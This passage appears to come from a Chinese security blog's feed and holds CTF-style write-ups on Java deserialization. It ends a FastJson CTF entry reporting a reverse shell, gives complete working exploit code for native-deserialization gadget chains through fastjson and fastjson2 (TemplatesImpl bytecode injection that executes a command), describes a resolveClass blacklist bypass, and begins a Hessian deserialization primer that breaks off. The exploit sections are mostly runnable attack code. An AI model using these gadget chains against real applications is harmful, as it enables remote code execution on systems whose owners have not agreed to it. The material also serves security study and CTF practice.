href="#第三次反序列化（也是反序列化成功的开始）" class="headerlink" title="第三次反序列化（也是反序列化成功的开始）"></a>第三次反序列化（也是反序列化成功的开始）</h3><p>先提前架起ldap服务和vps监听</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239279.png" alt="image-20230505022409515"></p><p>发送payload</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240664.png" alt="image-20230505022432324"></p><p>通过了前面三个类的checkAutoType方法，来到BadAttributeValueExpException的readObject方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240513.png" alt="image-20230505022631154"></p><p>接着触发getter</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240832.png" alt="image-20230505022649684"></p><p>成功反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240730.png" alt="image-20230505022721373"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastJson与原生反序列化</title>
      <link href="/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJson与原生反序列化"><a href="#FastJson与原生反序列化" class="headerlink" title="FastJson与原生反序列化"></a>FastJson与原生反序列化</h1><h2 id="第一版-lt-1-2-49"><a href="#第一版-lt-1-2-49" class="headerlink" title="第一版 &lt;1.2.49"></a>第一版 &lt;1.2.49</h2><p>在Json类当中的toString方法能触发toJsonString的调用，而这个东西其实我们并不陌生，在我们想用JSON.parse()触发get方法时，其中一个处理方法就是用JSONObject嵌套我们的payload</p><p>触发toString-&gt;toJSONString-&gt;get方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032239697.png" alt="image-20230421235341029"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;y4tacker&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="fastjson2-全版本"><a href="#fastjson2-全版本" class="headerlink" title="fastjson2 全版本"></a>fastjson2 全版本</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;y4tacker&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="绕过resolveClass"><a href="#绕过resolveClass" class="headerlink" title="绕过resolveClass"></a>绕过resolveClass</h2><h3 id="查看不会调用的情况"><a href="#查看不会调用的情况" class="headerlink" title="查看不会调用的情况"></a>查看不会调用的情况</h3><p>跟进<code>java.io.ObjectInputStream#readObject0</code>,会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">switch</span> (tc) &#123;<br>                <span class="hljs-keyword">case</span> TC_NULL:<br>                    <span class="hljs-keyword">return</span> readNull();<br>                <span class="hljs-keyword">case</span> TC_REFERENCE:<br>                    <span class="hljs-keyword">return</span> readHandle(unshared);<br>                <span class="hljs-keyword">case</span> TC_CLASS:<br>                    <span class="hljs-keyword">return</span> readClass(unshared);<br>                <span class="hljs-keyword">case</span> TC_CLASSDESC:<br>                <span class="hljs-keyword">case</span> TC_PROXYCLASSDESC:<br>                    <span class="hljs-keyword">return</span> readClassDesc(unshared);<br>                <span class="hljs-keyword">case</span> TC_STRING:<br>                <span class="hljs-keyword">case</span> TC_LONGSTRING:<br>                    <span class="hljs-keyword">return</span> checkResolve(readString(unshared));<br>                <span class="hljs-keyword">case</span> TC_ARRAY:<br>                    <span class="hljs-keyword">return</span> checkResolve(readArray(unshared));<br>                <span class="hljs-keyword">case</span> TC_ENUM:<br>                    <span class="hljs-keyword">return</span> checkResolve(readEnum(unshared));<br>                <span class="hljs-keyword">case</span> TC_OBJECT:<br>                    <span class="hljs-keyword">return</span> checkResolve(readOrdinaryObject(unshared));<br>                <span class="hljs-keyword">case</span> TC_EXCEPTION:<br>                    <span class="hljs-type">IOException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> readFatalException();<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WriteAbortedException</span>(<span class="hljs-string">&quot;writing aborted&quot;</span>, ex);<br>                <span class="hljs-keyword">case</span> TC_BLOCKDATA:<br>                <span class="hljs-keyword">case</span> TC_BLOCKDATALONG:<br>                    <span class="hljs-keyword">if</span> (oldMode) &#123;<br>                        bin.setBlockDataMode(<span class="hljs-literal">true</span>);<br>                        bin.peek();             <span class="hljs-comment">// force header read</span><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptionalDataException</span>(<br>                            bin.currentBlockRemaining());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                            <span class="hljs-string">&quot;unexpected block data&quot;</span>);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> TC_ENDBLOCKDATA:<br>                    <span class="hljs-keyword">if</span> (oldMode) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptionalDataException</span>(<span class="hljs-literal">true</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                            <span class="hljs-string">&quot;unexpected end of block data&quot;</span>);<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                        String.format(<span class="hljs-string">&quot;invalid type code: %02X&quot;</span>, tc));<br>            &#125;<br></code></pre></td></tr></table></figure><p>上面的不同case中大部分类都会最终调用<code>readClassDesc</code>去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是<code>TC_CLASSDESC</code>那么就会在<code>readNonProxyDesc</code>中触发<code>resolveClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032239877.png" alt="image-20230511210810954"></p><p>上面这个switch分支的代码，不会调用<code>readClassDesc</code>的分支有<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code></p><p>所以思路是放两个类进去，并且第二个类必须是<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code>中的一个，这里利用引用类型（因为其他类型要么毫无用处，要么用于解决序列化终止相关）</p><h3 id="引用类型的利用"><a href="#引用类型的利用" class="headerlink" title="引用类型的利用"></a>引用类型的利用</h3><p>当向List、set、map类型中添加同样对象时即可成功利用，这里也简单提一下，这里以List为例，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList&lt;Object&gt; arrayList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>arrayList.add(templates);<br>arrayList.add(templates);<br>writeObjects(arrayList);<br></code></pre></td></tr></table></figure><p>当我们写入同样的对象时，第二个会变成引用类型</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032239655.png" alt="image-20230511211004050"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessian反序列化</title>
      <link href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Hessian-反序列化"><a href="#Hessian-反序列化" class="headerlink" title="Hessian 反序列化"></a>Hessian 反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>Remote Procedure Call Protocol，远程过程调用协议，和 RMI（Remote Method Invocation，远程方法调用）类似，都能通过网络调用远程服务，但 RPC 是以标准的二进制格式来定义请求的信息，可用实现跨语言和跨操作系统通讯。</p><p>通讯过程：</p><p>1.客户端发起请求，并按照 RPC 协议格式填充信息<br>2.填充完毕后将二进制格式文件转化为流，通过传输协议进行传输<br>3.服务端接收到流后，将其转换为二进制格式文件，并按照 RPC 协议格式获取请求信息并进行处理<br>4.处理完毕后将结果按照 RPC 协议格式写入二进制格式文件中并返回</p><p>maven 添加扩展：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hessian<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.63<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Hessian反序列化与原生反序列化的区别"><a href="#Hessian反序列化与原生反序列化的区别" class="headerlink" title="Hessian反序列化与原生反序列化的区别"></a>Hessian反序列化与原生反序列化的区别</h3><p>示例类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Code</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;ttt&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">222</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span>&#123;<br>        System.out.print(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原生序列化反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser);<br>        oser.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Code</span>());<br>        oser.close();<br><br>        System.out.println(ser);<br>        ObjectInputStream unser=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        Object newobj=unser.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236138.png" alt="image-20230126221405110"></p><p>Hessian序列化反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        HessianOutput hessianOutput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Code</span>());<br>        hessianOutput.close();<br><br>        System.out.println(ser);<br><br>        HessianInput hessianInput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072235712.png" alt="image-20230126222015375"></p><blockquote><p>从运行结果中可以看出，<code>Hessian</code>反序列化不会自动调用反序列化类的<code>readObject</code>方法，这也就直接导致JDK原生反序列化的大多数<code>gadget</code>在<code>Hessian</code>反序列化中是不能用的。</p><p>还有一个很重要的区别，<code>hessian</code>反序列化中序列化的类不需要实现序列化接口。</p></blockquote><h3 id="Hessian反序列化漏洞"><a 